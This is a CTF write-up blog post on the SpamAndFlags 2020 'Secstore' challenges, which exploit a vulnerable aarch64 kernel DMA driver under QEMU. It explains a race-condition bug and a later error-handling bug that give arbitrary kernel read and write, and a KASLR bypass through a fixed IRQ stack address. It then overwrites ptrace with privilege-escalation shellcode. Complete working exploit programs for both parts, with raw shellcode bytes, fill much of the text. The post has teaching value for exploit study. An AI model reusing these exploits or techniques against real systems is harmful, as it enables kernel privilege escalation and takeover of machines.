---
layout: post
title:  "SpamAndFlags2020 Secstore"
date:   2020-05-10 
author: numbers
tags: [kernel, aarch64, qemu]
---


## Secstore 1

### The Challenge

    Today we are glad to announce that our bug reward program is extended to cover 
    our latest secure storage technology. We are so confident in the security of 
    our product that we are releasing everything a bounty hunter might need for a 
    successful audit.

We are given a tarball with a compiled `qemu-system-aarch64`, an initrd, some
scripts, and a patch and C file. A quick glance at the C file reveals that it is
a kernel driver.

One thing to note is that the `run.sh` says 

    # This is not a qemu pwning challenge.

So we know right off the bat that we don't need to exploit the customized qemu.

There is also a provided `serve.py` which happens to have different qemu
parameters than the run.sh. I don't know if this was an oversight on the part of
the challenge dev, but I just ignored the `run.sh` and focused on the `serve.py`.

In the `serve.py`, I noticed that qemu is launched with `-smp 2`, probably
indicating a race condition bug.

### Reversing it out

Taking a look at the qemu patch, we can see MemMapEntry list has been modified
to add two mappings called `VIRT_SDMA` and `VIRT_SECURE_DMA`. Most of the qemu
boilerplate is unimportant for the challenge, but patch implements an iomemory
device and backing region to read and store data from the guest kernel, or write
stored data back to the guest. One thing I noted early is that the patch uses
`arm_cpu_get_phys_page_attrs_debug` to translate virtual to physical addresses,
which will only work on kernel virtual addresses.

The kernel driver is essentially a wrapper around the DMA interface. It exposes
`read()` and `write()` handlers which accept an array (max 8) of the following struct as
arguments:
```c
    cstruct lli{
        uint64_t src;
        uint64_t dst;
        uint32_t size;
        uint32_t ctrl;
        };
```

When writing, the `dst` parameter is treated as an offset into the qemu store,
and when reading, the `src` is used as the offset. At first, it seemed odd that
ctrl is taken from the user, but it is unconditionally set on line 164:
```c
    items[i].ctrl = PL666_LLI_MORE;
```

Ultimately, the LLI buffer will be handed directly to the DMA engine, and the
`LLI_MORE` flag indicates that there are more entries in the LLI array. The final
entry gets the `LLI_MORE` flag unset on line 176:
```c
    items[(len/sizeof(struct lli)) - 1].ctrl &= ~PL666_LLI_MORE;
```

The driver uses a function called `map_to_kernel` to get kernel addresses from the user arguments (for the page table
translation). 
```c
    // This is used to map userspace memory for kernel and dma access
    // pins the page in physical memory
    static int map_to_kernel(uint64_t uaddr, struct page** page, void ** kaddr){
        int err;
        if(!access_ok((void*)uaddr, PAGE_SIZE)){
            return -1;
        }
        down_read(&current->mm->mmap_sem);
        err = pin_user_pages((uint64_t)uaddr, 1, FOLL_TOUCH |FOLL_POPULATE, page, 0);
        up_read(&current->mm->mmap_sem);
        if (err != 1) {
            return -2;
        }
        *kaddr = vmap(page, 1, VM_MAP, PAGE_KERNEL);
        if (!*kaddr){
            return -3;
        }
        return 0;
    }
```

This function first verifies that at least a page starting at the user address
is valid, then pins the pages to prevent them from being paged out. There is a
good [LWN article](https://lwn.net/Articles/807108/) on the `*_user_pages` function family, but ultimately the
nuances were not important for this challenge. Lastly, the function uses `vmap`
to get a kernel virtual address for the pages retrieved by `pin_user_pages`.

### The Bug

I immediately noticed that the driver is not using a typical `copy_from_user`
paradigm for the LLI array, but instead uses `map_to_kernel`:
```c
    err = map_to_kernel((uint64_t)buffer, &pages[mapped], &kaddr[mapped]);
```

This exposes the driver to potential race conditions as the user can edit the
contents of the argument buffer from another thread while the command is being
processed. Additionally, there is a "low hanging fruit" information leak:
```c
    err = map_to_kernel((uint64_t)buffer, &pages[mapped], &kaddr[mapped]);
    mapped++;
    //...
    items = (struct lli*)kaddr[0];
    //...
    if (dir == DMA_READ) {
      items[i].dst = (uint64_t)kaddr[i+1];
      items[i].ctrl |= PL666_LLI_READ;
    } else {
      items[i].src = (uint64_t)kaddr[i+1];
    }
```

The driver maps our argument buffer into the kernel, and ultimately reuses the
same memory to build the LLI array for DMA, with translated (kernel)
addresses. We can read out these addresses after the driver call finishes,
leaking the addresses returned by `vmap`.

There are a number of ways to attack the driver with race conditions against the
`secs_do_dma` function. I probably spent a bit too much time during the CTF
thinking about how to win reliably. We might change a src/dst address to an
arbitrary kernel address after it has been set by the driver, but I found a
technique which made my exploit logic easier to handle. If we race the
`ctrl` flag to set `PL666_LLI_MORE` after it has been unset, we can cause the
hardware to handle additional, fully controlled LLI entries. 
```c
    void * racer(void * arg) {
        struct racer_arg * targ = arg;
        volatile struct lli * arg_buf = targ->arg;
        while(1) {
            printf("(Thread 2): Waiting\n");
            while(!racer_run) {};
            printf("(Thread 2): Running\n");
            while(racer_run){
                __atomic_store_n(&(arg_buf[0].ctrl), PL666_LLI_MORE, __ATOMIC_SEQ_CST);
            }
        }
        printf("(Thread 2): Done racer\n");
        return NULL; 
    }
    uint64_t read_kernel(int fd, uint64_t kaddr, uint64_t size) {
        printf("(Thread 1): Read %p:%x\n", kaddr, size);    
        //valid entry, will be read from user to hw
        memset(buf, 0, sizeof(struct lli) * 4);
        buf[0].src  = a;
        buf[0].size = 0x10;
        //forged entry (write from kaddr to hw)
        buf[1].src  = kaddr;
        buf[1].dst  = 0x100;
        buf[1].size = size;
        buf[1].ctrl = 0;
        //do the race
        racer_run = 1;
        for(int i = 0; i < 3; i++) {
          buf[0].src  = a;
          write(fd, buf, sizeof(struct lli));
        }
        racer_run = 0;
        //read out the resulting data
        memset(a, 0x0, size);
        buf[0].dst  = a;
        buf[0].src  = 0x100;
        buf[0].size = size;
        read(fd, buf, sizeof(struct lli));
        void * data = malloc(size);
        memcpy(data, a, size);
        return data;
    }
```

Note that I don't think the atomic builtin is actually needed, but I was having
issues with GCC optimizing things out and it worked as a hack. This race wins
reliably in 1 attempt, very rarely 2 attempts. In practice, attempting the race
3 times did not fail in any of my testing. Writing is essentially the same, but
I first populate the hardware with data, and set `PL666_LLI_READ` on my forged LLI
to trigger the HW to write to the kernel address.
```c
    void write_kernel(int fd, uint64_t kaddr, void * uaddr, uint64_t size){
        printf("(Thread 1): Write %p:%x\n", kaddr, size);    
        //populate hw with data to write:
        memcpy(a, uaddr, size);
        buf[0].src = a;
        buf[0].dst = 0x1000;
        buf[0].size = size;
        write(fd, buf, sizeof(struct lli));
        //valid entry, will be read from user to hw
        memset(buf, 0, sizeof(struct lli) * 4);
        buf[0].src  = a;
        buf[0].size = 0x10;
        //forged entry (write from hw to kaddr)
        buf[1].src  = 0x1000;
        buf[1].dst  = kaddr;
        buf[1].size = size;
        buf[1].ctrl = PL666_LLI_READ;
        //do the race
        racer_run = 1;
        for(int i = 0; i < 16; i++) {
            buf[0].src = a;
            write(fd, buf, sizeof(struct lli));
        }
        racer_run = 0;
        return;
    }
```

### Exploitation: KASLR? Never heard of it!

At this point I spun my wheels for many, many hours trying to find the kernel
base from the info leak we get. The addresses returned by `vmap` don't seem to be
relative to the kernel base, and therefore are not useful as an info leak. I spent a good
bit of time with gdb exploring the memory around those regions looking for
something valid, but I couldn't make anything reliable. I went down a huge rabbit
hole after realizing I could scan relative to my leaked `vmap` addresses and
find the `pl666_data` structure. I was eventually able to forge a `struct
wait_queue_entry` and link it to the `dma_wait` list, which got me program
counter control but no closer to actually landing.

While looking at my crash with controled PC in the oops message, I noticed something weird
and extremely useful. Since we are crashing in an IRQ handler, our stack is the
IRQ stack&#x2026; and the address didn't seem to be changing!
After digging a bit into the kernel source, I found an
[lwn article](https://lwn.net/Articles/657969/) describing a patch to introduce the IRQ stack, using
`__get_free_pages` to allocate it. On [modern](https://elixir.bootlin.com/linux/latest/source/arch/arm64/include/asm/vmap_stack.h#L18) kernels, the IRQ stacks are
allocated with `__vmalloc_node_range`, but the effect is the same: No
randomization.

After dumping a page from the IRQ stack on 3 different runs with kaslr disabled and digging around
in the diff, I found the address `0xffff800010938d38` which reliably has a
kernel text address (`_ctype` according to kallsyms). 

At this point, I had program counter control and a kernel base leak. SMEP/SMAP
and KPTI are enabled, so normally from here I would proceed to write a ropchain
and win. However, my PC control gets execution while atomic (IRQ handler), which
significantly increases the complexity required of a ropchain. But also&#x2026;

### Exploitation: DMA is fun

The qemu extension mimics DMA by writing directly to the "physical" (host
virtual) memory of the guest. This means it ignores the virtual permission flags of
those pages, allowing us to write shellcode directly kernel executable memory. I
chose to overwrite `ptrace` as nothing on the vm would be calling that syscall
besides me.

Resolve the needed kernel functions:
```c
    uint64_t * kstack_leak = read_kernel(secfd, 0xffff800010003758, 16);
    printf("##\t%p:%p (%p)\n",0xffff800010003758, kstack_leak[0], kstack_leak[0] - 0x8b8d38);
    uint64_t kernel_base         = kstack_leak[0] - 0x8b8d38;
    uint64_t prepare_kernel_cred = kernel_base + 0x696a8;
    uint64_t commit_creds        = kernel_base + 0x693e0;
    uint64_t __arm64_sys_ptrace  = kernel_base + 0x49c88;
```

Write some simple shellcode:
```
    STP             X29, X30, [SP,#-0x20]!
    LDR x9, = 0x4242424242424242
    mov x0, 0
    BLR x9
    LDR x9, = 0x4343434343434343
    blr x9
    LDP             X29, X30, [SP],#0x20
    ret
```
```c
    uint64_t shellcode[0x200/8];
    char * sc = "\xfd\x7b\xbe\xa9\xe9\x00\x00\x58\x00\x00\x80\xd2\x20\x01\x3f\xd6\xc9\x00\x00\x58\x20\x01\x3f\xd6\xfd\x7b\xc2\xa8\xc0\x03\x5f\xd6\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";
    memcpy(shellcode, sc, 0x100);
    shellcode[4]  = prepare_kernel_cred;
    shellcode[5]  = commit_creds;
```

Write it to the kernel, and execute:
```c
    write_kernel(secfd, __arm64_sys_ptrace, shellcode, 0x200);
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    system("/bin/sh");
```

Hilariously, the flag includes a stackoverflow link where someone suggested this
code

    SaF{so_easy_to_write_kernel_drivers_with_stackoverflow_https://stackoverflow.com/a/5540080}

The full exploit is available at the bottom of this page.

## Secstore 2

### Trivial?

    SSE-2020-17866: Memory corruption in secure storage - Fixed
    Severity: Medium
    Reported: May 09, 2020 06:20
    Submitter: p4
    A possible memory corruption primitive exists in the secure storage driver with
    unknown impact. 
    A patch prevents the root cause of the corruption. 
    
    All previously reported bugs are fixed in our product, unfortunately our open
    source mirror has not been updated yet. This should not discourage talented bug
    hunters, the updated release is available here.

So for part 2, we won't be given source, but instead we are only given the
compiled (updated) driver.

The new driver, while not completely rewritten, does actually have quite a few
changes. It adds a new `proc` entry which is most likely intended to be used for
the info leak. The original bug is patched by using `copy_from_user` to read the
arguments into `secs_do_dma`, and the `map_to_kernel` function is completely inlined
away.

Ultimately, I didn't do much reversing on the differences, because I noticed the
error cases while processing the LLI buffer just print an error and continue
rather than breaking the loop. This lets us trivially pass arbitrary kernel
addresses to the DMA:
```c
    uint64_t read_kernel(int fd, uint64_t kaddr, uint64_t size) {
        memset(buf, 0, sizeof(struct lli) * 4);
        buf[0].src  = a;
        buf[0].size = 0x10;
        buf[1].src  = kaddr;
        buf[1].dst  = 0x100;
        buf[1].size = size;
        buf[1].ctrl = PL666_LLI_MORE;
        write(fd, buf, sizeof(struct lli) * 2);
        memset(a, 0x0, size);
        buf[0].dst  = a;
        buf[0].src  = 0x100;
        buf[0].size = size;
        read(fd, buf, sizeof(struct lli));
        void * data = malloc(size);
        memcpy(data, a, size);
        return data;
    }
    uint64_t write_kernel(int fd, uint64_t kaddr, void * uaddr, uint64_t size) {
        memcpy(a, uaddr, size);
        buf[0].src = a;
        buf[0].dst = 0x1000;
        buf[0].size = size;
        write(fd, buf, sizeof(struct lli));    
        memset(buf, 0, sizeof(struct lli) * 4);
        buf[0].dst  = a;
        buf[0].size = 0x10;
        buf[1].dst  = kaddr;
        buf[1].src  = 0x1000;
        buf[1].size = size;
        buf[1].ctrl = PL666_LLI_MORE;
        return read(fd, buf, sizeof(struct lli) * 2);
    }
```

The only other change I made to the exploit was to modify the address used to
leak from the IRQ stack. I think the change in the number of DMA transactions
done in the second exploit causes the IRQ stack to populate differently, but I'm
not sure.
```c
    uint64_t* kstack_leak = read_kernel(secfd, 0xffff800010003ee8, 16);
    printf("##\t%p:%p (%p)\n",0xffff800010003ee8, kstack_leak[0], kstack_leak[0] - 0xf11aa0);
    uint64_t kernel_base =  kstack_leak[0] - 0xf11aa0;
```

Unfortunately, I didn't notice that I'd switched to using the old driver when
rebuilding the initrd to give me a root shell (to check proc kallsyms). I
got super frustrated when my exploit stopped working and wound up passing out at
8am. I woke up 5 minutes after the CTF ended and landed it immediately.

Nevertheless, the flag was 

    SaF{Sometimes Science Is More Art Than Science}

## Part 1 Exploit
```c
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/ptrace.h>

#define MAX_LLI 8
struct lli{
    uint64_t src;
    uint64_t dst;
    uint32_t size;
    uint32_t ctrl;
};
#define PL666_LLI_MORE 0x0001
#define PL666_LLI_READ 0x0002

volatile uint64_t racer_run  = 0;
struct racer_arg {
    struct lli * arg;
    uint64_t flag;
};
struct lli * buf = NULL;
void * a   = NULL;

void * racer(void * arg) {
    struct racer_arg * targ = arg;
    volatile struct lli * arg_buf = targ->arg;
    while(1) {
        printf("(Thread 2): Waiting\n");
        while(!racer_run) {};
        printf("(Thread 2): Running\n");
        while(racer_run){
            __atomic_store_n(&(arg_buf[0].ctrl), PL666_LLI_MORE, __ATOMIC_SEQ_CST);
        }
    }
    printf("(Thread 2): Done racer\n");
    return NULL; 
}
uint64_t read_kernel(int fd, uint64_t kaddr, uint64_t size) {
    printf("(Thread 1): Read %p:%x\n", kaddr, size);    
    //valid entry, will be read from user to hw
    memset(buf, 0, sizeof(struct lli) * 4);
    buf[0].src  = a;
    buf[0].size = 0x10;
    //forged entry (write from kaddr to hw)
    buf[1].src  = kaddr;
    buf[1].dst  = 0x100;
    buf[1].size = size;
    buf[1].ctrl = 0;
    //do the race
    racer_run = 1;
    for(int i = 0; i < 16; i++) {
      buf[0].src  = a;
      write(fd, buf, sizeof(struct lli));
    }
    racer_run = 0;
    //read out the resulting data
    memset(a, 0x0, size);
    buf[0].dst  = a;
    buf[0].src  = 0x100;
    buf[0].size = size;
    read(fd, buf, sizeof(struct lli));
    void * data = malloc(size);
    memcpy(data, a, size);
    return data;
}
void write_kernel(int fd, uint64_t kaddr, void * uaddr, uint64_t size){
    printf("(Thread 1): Write %p:%x\n", kaddr, size);    
    //populate hw with data to write:
    memcpy(a, uaddr, size);
    buf[0].src = a;
    buf[0].dst = 0x1000;
    buf[0].size = size;
    write(fd, buf, sizeof(struct lli));
    //valid entry, will be read from user to hw
    memset(buf, 0, sizeof(struct lli) * 4);
    buf[0].src  = a;
    buf[0].size = 0x10;
    //forged entry (write from hw to kaddr)
    buf[1].src  = 0x1000;
    buf[1].dst  = kaddr;
    buf[1].size = size;
    buf[1].ctrl = PL666_LLI_READ;
    //do the race
    racer_run = 1;
    for(int i = 0; i < 16; i++) {
        buf[0].src = a;
        write(fd, buf, sizeof(struct lli));
    }
    racer_run = 0;
    return;
}

int main() {
    int secfd = open("/dev/sec", O_RDWR); 
    buf = mmap((void*)0x10000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    a   = mmap((void*)0x20000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    pthread_t t;
    struct racer_arg targ;
    targ.arg = buf;
    pthread_create(&t, NULL, racer, &targ);
    uint64_t * kstack_leak = read_kernel(secfd, 0xffff800010003758, 16);
    printf("##\t%p:%p (%p)\n",0xffff800010003758, kstack_leak[0], kstack_leak[0] - 0x8b8d38);
    uint64_t kernel_base         = kstack_leak[0] - 0x8b8d38;
    uint64_t prepare_kernel_cred = kernel_base + 0x696a8;
    uint64_t commit_creds        = kernel_base + 0x693e0;
    uint64_t __arm64_sys_ptrace  = kernel_base + 0x49c88;

    uint64_t shellcode[0x200/8];
    char * sc = "\xfd\x7b\xbe\xa9\xe9\x00\x00\x58\x00\x00\x80\xd2\x20\x01\x3f\xd6\xc9\x00\x00\x58\x20\x01\x3f\xd6\xfd\x7b\xc2\xa8\xc0\x03\x5f\xd6\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";
    memcpy(shellcode, sc, 0x100);
    shellcode[4]  = prepare_kernel_cred;
    shellcode[5]  = commit_creds;
    
    printf("Write shellcode...\n");
    write_kernel(secfd, __arm64_sys_ptrace, shellcode, 0x200);
    printf("Executing...\n");
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);

    system("/bin/sh");
    return 0;
}
```

## Part 2 Exploit
```c
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/ptrace.h>

#define MAX_LLI 8
struct lli{
    uint64_t src;
    uint64_t dst;
    uint32_t size;
    uint32_t ctrl;
};
#define PL666_LLI_MORE 0x0001
#define PL666_LLI_READ 0x0002

struct lli * buf = NULL;
void * a   = NULL;

uint64_t read_kernel(int fd, uint64_t kaddr, uint64_t size) {
    memset(buf, 0, sizeof(struct lli) * 4);
    buf[0].src  = a;
    buf[0].size = 0x10;
    
    buf[1].src  = kaddr;
    buf[1].dst  = 0x100;
    buf[1].size = size;
	buf[1].ctrl = PL666_LLI_MORE;

    write(fd, buf, sizeof(struct lli) * 2);
    memset(a, 0x0, size);
    buf[0].dst  = a;
    buf[0].src  = 0x100;
    buf[0].size = size;
    read(fd, buf, sizeof(struct lli));
    
    void * data = malloc(size);
    memcpy(data, a, size);
    return data;
}
uint64_t write_kernel(int fd, uint64_t kaddr, void * uaddr, uint64_t size) {
    memcpy(a, uaddr, size);
    buf[0].src = a;
    buf[0].dst = 0x1000;
    buf[0].size = size;
    write(fd, buf, sizeof(struct lli));    

    memset(buf, 0, sizeof(struct lli) * 4);
    buf[0].dst  = a;
    buf[0].size = 0x10;
	buf[1].dst  = kaddr;
    buf[1].src  = 0x1000;
    buf[1].size = size;
	buf[1].ctrl = PL666_LLI_MORE;
    return read(fd, buf, sizeof(struct lli) * 2);
}
int main() {
    int secfd = open("/dev/sec", O_RDWR); 
    char * nop[0x10];
    buf = mmap((void*)0x10000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    a   = mmap((void*)0x20000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    uint64_t* kstack_leak = read_kernel(secfd, 0xffff800010003ee8, 16);
    printf("##\t%p:%p (%p)\n",0xffff800010003ee8, kstack_leak[0], kstack_leak[0] - 0xf11aa0);

	uint64_t kernel_base =  kstack_leak[0] - 0xf11aa0;
    uint64_t prepare_kernel_cred = kernel_base + 0x696a8;
    uint64_t commit_creds        = kernel_base + 0x693e0;
    uint64_t call_usermodehelper = kernel_base + 0x5a9a0;
    uint64_t __arm64_sys_ptrace  = kernel_base + 0x49c88;

    uint64_t shellcode[0x200/8];
    char * sc = "\xfd\x7b\xbe\xa9\xe9\x00\x00\x58\x00\x00\x80\xd2\x20\x01\x3f\xd6\xc9\x00\x00\x58\x20\x01\x3f\xd6\xfd\x7b\xc2\xa8\xc0\x03\x5f\xd6\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";
    memcpy(shellcode, sc, 0x100);
    shellcode[4]  = prepare_kernel_cred;
    shellcode[5]  = commit_creds;
    
    printf("Write shellcode...\n");
    write_kernel(secfd, __arm64_sys_ptrace, shellcode, 0x200);
    
    printf("Going to exec %p\n", __arm64_sys_ptrace);
    read(0, nop, 1);
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);

    system("/bin/sh");
    return 0;
}
```
